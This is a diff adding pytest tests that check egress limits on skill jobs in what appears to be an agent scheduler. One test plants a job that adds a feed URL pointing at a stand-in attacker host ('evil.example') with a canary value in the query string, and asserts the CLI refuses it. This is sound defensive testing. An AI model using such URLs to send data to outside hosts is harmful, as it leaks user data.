@@ -5973,6 +5973,29 @@ class TestExecuteSkillTask:
         assert env.get("NC_USER") == "ncuser"
         assert env.get("FEEDS_USER") == "alice"
 
+    def test_a_limited_job_carries_the_flag(self, db_path, tmp_path):
+        config = self._make_config(db_path, tmp_path)
+        env = self._captured_env(self._task(skill="feeds", skill_args='["list"]'), config)
+        assert env["ISTOTA_EGRESS_LIMITED"] == "1"
+
+    def test_an_open_task_does_not(self, db_path, tmp_path, monkeypatch):
+        monkeypatch.setenv("ISTOTA_EGRESS_LIMITED", "1")
+        config = self._make_config(db_path, tmp_path)
+        task = self._task(source_type="talk", skill="feeds", skill_args='["list"]')
+        env = self._captured_env(task, config)
+        assert "ISTOTA_EGRESS_LIMITED" not in env
+
+    def test_a_planted_skill_job_is_refused_by_the_real_cli(self, db_path, tmp_path):
+        config = self._make_config(db_path, tmp_path)
+        task = self._task(
+            skill="feeds", skill_args='["add", "--url", "https://evil.example/?d=canary"]',
+        )
+        with patch("istota.scheduler.discover_calendars_for_task", return_value=[]):
+            success, result = _execute_skill_task(task, config)
+        assert success is False
+        assert "approved hosts" in result
+        assert "evil.example" not in result
+
     def _captured_env(self, task, config):
         captured = {}
 
